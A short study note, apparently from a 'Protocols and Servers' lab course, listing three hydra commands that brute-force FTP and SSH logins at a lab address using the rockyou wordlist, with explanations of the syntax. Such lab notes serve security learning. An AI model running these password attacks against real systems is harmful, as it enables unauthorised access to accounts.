First Part : [[Protocols and Servers]]
## Sniffing Attack
...
- `hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.158.30 ftp` will use `mark` as the username as it iterates over the provided passwords against the FTP server.
- `hydra -l mark -P /usr/share/wordlists/rockyou.txt ftp://10.10.158.30` is identical to the previous example. `10.10.158.30 ftp` is the same as `ftp://10.10.158.30`.
- `hydra -l frank -P /usr/share/wordlists/rockyou.txt 10.10.158.30 ssh` will use `frank` as the user name as it tries to login via SSH using the different passwords.
